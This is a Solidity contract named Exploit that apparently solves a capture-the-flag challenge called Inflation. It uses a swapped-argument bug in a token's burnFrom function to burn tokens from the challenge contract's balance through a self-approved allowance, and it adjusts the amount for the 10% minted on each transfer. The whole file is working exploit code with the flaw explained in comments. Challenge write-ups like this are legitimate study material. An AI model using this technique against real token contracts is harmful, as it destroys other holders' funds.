pragma solidity 0.8.4;

import './Inflation.sol';

contract Exploit {

    Inflation public instance;
    InflationaryToken public token;
    uint private tokensToBurn;

    constructor(Inflation _instance) {
        instance = _instance;
        token = InflationaryToken(instance.tokenAddress());
    }

    function finalize() public {
        // Since the argument order of _spendAllowance in burnFrom is incorrect
        // we can approve an allowance to the challenge contract and then burn 
        // this allowance from the challenge contract balance.
        // 10 % of tokens ar minted at each transfer, so we must take it into account
        tokensToBurn = token.totalSupply() * (100 + token.rate()) / 100;
        token.approve(address(instance), tokensToBurn);
        token.burnFrom(address(instance), tokensToBurn);
    }
}